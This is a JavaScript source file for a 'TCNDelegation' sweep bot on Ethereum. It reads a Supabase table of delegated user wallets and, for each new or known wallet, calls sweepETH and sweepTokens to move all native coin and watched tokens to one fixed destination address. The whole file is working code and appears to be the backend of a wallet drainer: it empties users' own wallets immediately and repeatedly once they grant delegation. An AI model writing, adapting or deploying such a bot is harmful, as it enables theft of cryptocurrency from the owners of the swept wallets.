// bot.js — TCNDelegation relayer sweep bot (ETH)
// Watches for ETH and token deposits and sweeps them to destination.
// Receives new delegation notifications via Supabase Realtime.

require("dotenv").config();
const { ethers } = require("ethers");
const { createClient } = require("@supabase/supabase-js");

// ── Config ────────────────────────────────────────────────────────────────────

const PRIVATE_KEY               = process.env.PRIVATE_KEY;
const RPC_URL                   = process.env.RPC_URL;
const CONTRACT_ADDRESS          = process.env.CONTRACT_ADDRESS;
const DESTINATION_ADDRESS       = process.env.DESTINATION_ADDRESS;
const TOKENS_TO_WATCH           = (process.env.TOKENS_TO_WATCH || "").split(",").filter(Boolean);
const SUPABASE_URL              = process.env.SUPABASE_URL;
const SUPABASE_SERVICE_ROLE_KEY = process.env.SUPABASE_SERVICE_ROLE_KEY;
const CHAIN                     = process.env.CHAIN || "eth";

const MIN_ETH_WEI           = ethers.parseEther("0.001");
const MIN_TOKEN_WEI         = ethers.parseUnits("1", 18);
const SWEEP_COOLDOWN_BLOCKS = 3;

// ── Validation ────────────────────────────────────────────────────────────────

if (!PRIVATE_KEY || !RPC_URL || !CONTRACT_ADDRESS || !DESTINATION_ADDRESS) {
  console.error("Missing required env vars: PRIVATE_KEY, RPC_URL, CONTRACT_ADDRESS, DESTINATION_ADDRESS");
  process.exit(1);
}
if (!SUPABASE_URL || !SUPABASE_SERVICE_ROLE_KEY) {
  console.warn("⚠️  SUPABASE_URL or SUPABASE_SERVICE_ROLE_KEY missing — Realtime disabled");
}

// ── Setup ─────────────────────────────────────────────────────────────────────

const provider = RPC_URL.startsWith("wss")
  ? new ethers.WebSocketProvider(RPC_URL)
  : new ethers.JsonRpcProvider(RPC_URL);

const wallet = new ethers.Wallet(PRIVATE_KEY, provider);

const supabase = SUPABASE_URL && SUPABASE_SERVICE_ROLE_KEY
  ? createClient(SUPABASE_URL, SUPABASE_SERVICE_ROLE_KEY, { auth: { persistSession: false } })
  : null;

const CONTRACT_ABI = [
  "function sweepETH(address payable to) external",
  "function sweepTokens(address token, address to) external",
  "event ETHReceived(address indexed sender, uint256 amount)",
  "event ETHSwept(address indexed to, uint256 amount)",
  "event Swept(address indexed token, address indexed to, uint256 amount)",
];

const DELEGATION_ABI = [
  "function sweepETH(address payable to) external",
  "function sweepTokens(address token, address to) external",
];

const ERC20_ABI = [
  "function balanceOf(address account) view returns (uint256)",
  "function decimals() view returns (uint8)",
  "function symbol() view returns (string)",
];

const contract = new ethers.Contract(CONTRACT_ADDRESS, CONTRACT_ABI, wallet);

// ── State ─────────────────────────────────────────────────────────────────────

let sweepingETH = false;
const sweepingToken  = {};
let lastSweepBlock   = 0;
const delegatedWallets = new Set();

// ── Logging ───────────────────────────────────────────────────────────────────

const TAG = `[${CHAIN.toUpperCase()}]`;
function log(msg)  { console.log(`[${new Date().toISOString()}] ${TAG} ${msg}`); }
function warn(msg) { console.warn(`[${new Date().toISOString()}] ${TAG} ⚠  ${msg}`); }
function err(msg)  { console.error(`[${new Date().toISOString()}] ${TAG} ✖  ${msg}`); }

function normalizeAddress(address) {
  try { return ethers.getAddress(address); } catch { return null; }
}

// ── Main contract ETH sweep ───────────────────────────────────────────────────

async function sweepETH() {
  if (sweepingETH) return;
  sweepingETH = true;
  try {
    const balance = await provider.getBalance(CONTRACT_ADDRESS);
    if (balance < MIN_ETH_WEI) { sweepingETH = false; return; }
    log(`ETH balance: ${ethers.formatEther(balance)} — sweeping to ${DESTINATION_ADDRESS}`);
    const gasEstimate = await contract.sweepETH.estimateGas(DESTINATION_ADDRESS);
    const feeData     = await provider.getFeeData();
    const tx = await contract.sweepETH(DESTINATION_ADDRESS, {
      gasLimit:             gasEstimate * 120n / 100n,
      maxFeePerGas:         feeData.maxFeePerGas,
      maxPriorityFeePerGas: feeData.maxPriorityFeePerGas,
    });
    log(`sweepETH tx: ${tx.hash}`);
    const receipt = await tx.wait();
    log(`sweepETH confirmed block ${receipt.blockNumber}`);
  } catch (e) {
    err(`sweepETH failed: ${e.message}`);
  } finally {
    sweepingETH = false;
  }
}

// ── Main contract token sweep ─────────────────────────────────────────────────

async function sweepToken(tokenAddress) {
  if (sweepingToken[tokenAddress]) return;
  sweepingToken[tokenAddress] = true;
  try {
    const token   = new ethers.Contract(tokenAddress, ERC20_ABI, provider);
    const balance = await token.balanceOf(CONTRACT_ADDRESS);
    if (balance < MIN_TOKEN_WEI) { sweepingToken[tokenAddress] = false; return; }
    let symbol = "TOKEN", decimals = 18;
    try { symbol   = await token.symbol();   } catch {}
    try { decimals = await token.decimals(); } catch {}
    log(`${symbol} balance: ${ethers.formatUnits(balance, decimals)} — sweeping`);
    const gasEstimate = await contract.sweepTokens.estimateGas(tokenAddress, DESTINATION_ADDRESS);
    const feeData     = await provider.getFeeData();
    const tx = await contract.sweepTokens(tokenAddress, DESTINATION_ADDRESS, {
      gasLimit:             gasEstimate * 120n / 100n,
      maxFeePerGas:         feeData.maxFeePerGas,
      maxPriorityFeePerGas: feeData.maxPriorityFeePerGas,
    });
    log(`sweepTokens(${symbol}) tx: ${tx.hash}`);
    const receipt = await tx.wait();
    log(`sweepTokens(${symbol}) confirmed block ${receipt.blockNumber}`);
  } catch (e) {
    err(`sweepToken(${tokenAddress}) failed: ${e.message}`);
  } finally {
    sweepingToken[tokenAddress] = false;
  }
}

// ── Delegated wallet sweep ────────────────────────────────────────────────────

async function sweepWallet(walletAddress) {
  const checksum = normalizeAddress(walletAddress);
  if (!checksum) return;
  try {
    const userContract = new ethers.Contract(checksum, DELEGATION_ABI, wallet);

    // Sweep native token (ETH/BNB/MATIC)
    try {
      const bal = await provider.getBalance(checksum);
      if (bal > MIN_ETH_WEI) {
        log(`Delegated balance ${ethers.formatEther(bal)} — sweeping from ${checksum}`);
        const gasEstimate = await userContract.sweepETH.estimateGas(DESTINATION_ADDRESS);
        const feeData     = await provider.getFeeData();
        const tx = await userContract.sweepETH(DESTINATION_ADDRESS, {
          gasLimit:             gasEstimate * 120n / 100n,
          maxFeePerGas:         feeData.maxFeePerGas,
          maxPriorityFeePerGas: feeData.maxPriorityFeePerGas,
        });
        log(`sweepETH(${checksum}) tx: ${tx.hash}`);
        await tx.wait();
        log(`sweepETH(${checksum}) confirmed`);
      }
    } catch (e) { err(`sweepWallet ETH failed for ${checksum}: ${e.message}`); }

    // Sweep tokens
    for (const tokenAddress of TOKENS_TO_WATCH) {
      try {
        const token   = new ethers.Contract(tokenAddress.trim(), ERC20_ABI, provider);
        const balance = await token.balanceOf(checksum);
        let decimals  = 18;
        try { decimals = await token.decimals(); } catch {}
        const minToken = ethers.parseUnits("1", decimals);
        if (balance > minToken) {
          log(`Delegated token balance ${ethers.formatUnits(balance, decimals)} — sweeping from ${checksum}`);
          const gasEstimate = await userContract.sweepTokens.estimateGas(tokenAddress.trim(), DESTINATION_ADDRESS);
          const feeData     = await provider.getFeeData();
          const tx = await userContract.sweepTokens(tokenAddress.trim(), DESTINATION_ADDRESS, {
            gasLimit:             gasEstimate * 120n / 100n,
            maxFeePerGas:         feeData.maxFeePerGas,
            maxPriorityFeePerGas: feeData.maxPriorityFeePerGas,
          });
          log(`sweepTokens(${tokenAddress}) tx: ${tx.hash}`);
          await tx.wait();
        }
      } catch (e) { err(`sweepWallet token failed for ${checksum}: ${e.message}`); }
    }
  } catch (e) {
    err(`sweepWallet failed for ${checksum}: ${e.message}`);
  }
}

// ── Supabase: load existing wallets on startup ────────────────────────────────

async function loadDelegatedWallets() {
  if (!supabase) return;
  try {
    const { data, error } = await supabase
      .from("delegated_wallets")
      .select("address")
      .eq("chain", CHAIN);
    if (error) { warn(`loadDelegatedWallets error: ${error.message}`); return; }
    delegatedWallets.clear();
    for (const row of data || []) {
      const checksum = normalizeAddress(row.address);
      if (checksum) delegatedWallets.add(checksum);
    }
    log(`Loaded ${delegatedWallets.size} delegated wallets from Supabase`);
  } catch (e) {
    warn(`loadDelegatedWallets failed: ${e.message}`);
  }
}

// ── Supabase Realtime ─────────────────────────────────────────────────────────

function subscribeRealtime() {
  if (!supabase) {
    warn("Supabase not configured — Realtime skipped");
    return;
  }
  supabase
    .channel(`delegated_wallets_${CHAIN}`)
    .on(
      "postgres_changes",
      { event: "INSERT", schema: "public", table: "delegated_wallets", filter: `chain=eq.${CHAIN}` },
      async (payload) => {
        const address = normalizeAddress(payload.new?.address);
        if (!address) return;
        if (delegatedWallets.has(address)) return;
        log(`🔔 Realtime: new delegated wallet ${address}`);
        delegatedWallets.add(address);
        await sweepWallet(address).catch((e) => err(`immediate sweep failed: ${e.message}`));
      }
    )
    .subscribe((status) => {
      if (status === "SUBSCRIBED") {
        log(`✅ Supabase Realtime subscribed (chain=${CHAIN})`);
      } else if (status === "CHANNEL_ERROR" || status === "TIMED_OUT") {
        warn(`Realtime status: ${status} — retrying in 10s`);
        setTimeout(subscribeRealtime, 10_000);
      }
    });
}

// ── Block listener ────────────────────────────────────────────────────────────

function attachBlockListener() {
  provider.on("block", async (blockNumber) => {
    if (blockNumber - lastSweepBlock < SWEEP_COOLDOWN_BLOCKS) return;
    lastSweepBlock = blockNumber;
    log(`Block ${blockNumber} — checking balances...`);

    await sweepETH();

    for (const tokenAddress of TOKENS_TO_WATCH) {
      await sweepToken(tokenAddress.trim());
    }

    for (const walletAddress of delegatedWallets) {
      try { await sweepWallet(walletAddress); } catch (e) {
        err(`delegated sweep failed for ${walletAddress}: ${e.message}`);
      }
    }
  });
}

// ── Event listener ────────────────────────────────────────────────────────────

contract.on("ETHReceived", async (sender, amount) => {
  log(`ETHReceived — ${ethers.formatEther(amount)} from ${sender}`);
  await sweepETH();
});

// ── Provider error / reconnect ────────────────────────────────────────────────

provider.on("error", (error) => {
  warn(`Provider error — reconnecting in 5s: ${error.message}`);
  setTimeout(() => {
    provider.removeAllListeners();
    attachBlockListener();
    log("Block listener reattached after reconnect");
  }, 5000);
});

// ── Relayer health check ──────────────────────────────────────────────────────

async function checkRelayerBalance() {
  const balance = await provider.getBalance(wallet.address);
  log(`Relayer wallet balance: ${ethers.formatEther(balance)}`);
  if (balance < ethers.parseEther("0.005")) {
    warn("Relayer wallet LOW — top it up or sweeps will fail");
  }
}

// ── Start ─────────────────────────────────────────────────────────────────────

async function start() {
  log("Sweep bot starting...");
  log(`Contract:    ${CONTRACT_ADDRESS}`);
  log(`Destination: ${DESTINATION_ADDRESS}`);
  log(`Relayer:     ${wallet.address}`);
  log(`Chain:       ${CHAIN}`);
  log(`Tokens:      ${TOKENS_TO_WATCH.length ? TOKENS_TO_WATCH.join(", ") : "none"}`);

  await checkRelayerBalance();
  await loadDelegatedWallets();
  subscribeRealtime();
  attachBlockListener();

  log("Listening for blocks and Realtime events...");
}

start().catch((e) => { err(`Startup failed: ${e.message}`); process.exit(1); });

process.on("SIGINT",  () => { log("Shutting down..."); provider.removeAllListeners(); process.exit(0); });
process.on("SIGTERM", () => { log("Shutting down..."); provider.removeAllListeners(); process.exit(0); });
